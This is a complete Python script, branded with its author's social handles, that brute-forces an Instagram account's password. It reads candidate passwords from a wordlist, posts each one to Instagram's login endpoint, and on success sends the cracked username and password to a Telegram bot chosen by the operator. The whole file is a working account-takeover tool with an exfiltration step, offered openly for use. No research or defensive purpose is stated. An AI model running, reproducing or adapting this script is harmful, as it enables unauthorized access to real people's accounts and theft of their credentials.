import requests
import time
import random
import string
#تهكير انستغرام ويرسلها تيليجرام
#Hack Instagram and send it Telegram

A = '\033[1;10m'
B = '\033[1;30m'
C ='\033[1;36m'
D =('='*40)
print(f"""{A}{D}
<>---<>---<>---<>---<>---<>---<>---<>---<>
[*] Hack Instagram and send it Telegram [*]  
<>---<>---<>---<>---<>---<>---<>---<>---<>        
      >> Naplon ◕_◕ <<
 _   _             _             
| \ | |           | |            
|  \| | __ _ _ __ | | ___  _ __  
| . ` |/ _` | '_ \| |/ _ \| '_ \ 
| |\  | (_| | |_) | | (_) | | | |{C}
|_| \_|\__,_| .__/|_|\___/|_| |_|
            | | instagram: 3h6h                 
            |_| snap: tv-of  
                Telegram: naplon0  
<>---<>---<>---<>---<>---<>---<>---<>    

{D}""")   
session = requests.Session()

user = input('user: ')
id = input("enter id: ")
token = input("enter token: ")

password = input("enter password file name: ")
file = open(f"{password}", "r")

def insta():
    while True:

        password = file.readline().split('\n')[0]

        url = "https://www.instagram.com/accounts/login/ajax/"

        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'x-csrftoken': 'jHu55ttlksoa24nBYiVdJ9D7wKaSTCwD',
            'x-instagram-ajax': '5d8ba0e5398d',
            'x-ig-app-id': '936619743392459'
        }

        tim = str(time.time()).split(".")[1]

        data = {
            'username': f'{user}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }


        req = session.post(url, headers=headers, data=data).text

        if ('"authenticated":true') in req:
            print(f"Hacked user:{user} pass:{password}")

            tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Done\nuser:{user} pass:{password} ')

            req = requests.post(tlg)

            input("")
        
        elif '"checkpoint_url"' in req:
            print("sre.. !")

        else:
            print(f"Not Hacked user:{user} pass:{password}")
        
        time.sleep(3)

insta()
